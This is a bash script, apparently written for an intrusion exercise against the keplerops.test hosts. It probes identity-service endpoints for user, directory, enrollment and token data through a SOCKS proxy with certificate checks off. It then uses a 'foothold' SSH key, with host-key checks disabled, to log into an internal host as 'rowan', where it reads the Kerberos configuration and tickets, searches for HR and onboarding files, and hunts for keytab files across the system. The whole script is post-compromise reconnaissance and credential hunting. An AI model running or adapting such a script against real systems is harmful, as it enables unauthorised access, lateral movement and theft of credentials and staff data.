#!/bin/bash
P="--socks5-hostname 127.0.0.1:1080"
B=https://id.keplerops.test
for p in "" api api/ v1 v1/ health status version users user employees principals directory roster activation activations enroll enrollments enrollment onboarding .well-known/openid-configuration api/v1/users api/users oauth token login; do
  code=$(curl -sS $P -k -m 10 -o /tmp/i.$$ -w '%{http_code}' "$B/$p")
  echo "[$code] /$p :: $(head -c 200 /tmp/i.$$ | tr -d '\n')"
done
echo "###### identity same"
for p in "" api api/ v1 health users; do
  code=$(curl -sS $P -k -m 10 -o /tmp/i.$$ -w '%{http_code}' "https://identity.keplerops.test/$p")
  echo "[$code] /$p :: $(head -c 200 /tmp/i.$$ | tr -d '\n')"
done
rm -f /tmp/i.$$
echo "###### rowan krb/arwc files"
H='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180'
$H 'cat /etc/krb5.conf 2>/dev/null; echo "--- klist"; klist 2>&1 | head; echo "--- home tree"; find ~ -maxdepth 3 \( -iname "*arwc*" -o -iname "*mira*" -o -iname "*onboard*" -o -iname "*staff*" -o -iname "*hr*" \) 2>/dev/null | head -40; echo "--- keytabs"; find / -name "*.keytab" -o -name "krb5.keytab" 2>/dev/null | head'
